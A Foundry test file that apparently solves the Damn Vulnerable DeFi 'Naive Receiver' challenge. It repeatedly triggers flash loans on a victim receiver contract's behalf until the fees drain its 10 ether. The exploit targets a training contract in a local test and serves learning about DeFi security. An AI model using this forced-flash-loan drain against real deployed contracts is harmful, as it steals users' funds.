// SPDX-License-Identifier: MIT
pragma solidity =0.8.13;

import {NaiveReceiverLenderPool} from
"../src/damn-vulnerable-defi/contracts/naive-receiver/NaiveReceiverLenderPool.sol";
import {FlashLoanReceiver} from
"../src/damn-vulnerable-defi/contracts/naive-receiver/FlashLoanReceiver.sol";
import "forge-std/Test.sol";

contract MaliciousContract is Test {
    NaiveReceiverLenderPool receiver;
    FlashLoanReceiver flashLoanReceiver;

    address alice = vm.addr(15);

    function setUp() public {
        receiver = new NaiveReceiverLenderPool();
        flashLoanReceiver = new FlashLoanReceiver(address(receiver));

        payable(receiver).transfer(100 ether);
        payable(flashLoanReceiver).transfer(10 ether);
    }

    function testMaliciousFlashLoan() public {
        console.log(address(flashLoanReceiver).balance);

        for (uint8 i = 0; i < 10; ++i) {
            receiver.flashLoan(
                flashLoanReceiver,
                0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,
                0,
                ""
            );
        }

        console.log(address(flashLoanReceiver).balance);
        assertEq(address(flashLoanReceiver).balance, 0);
    }
}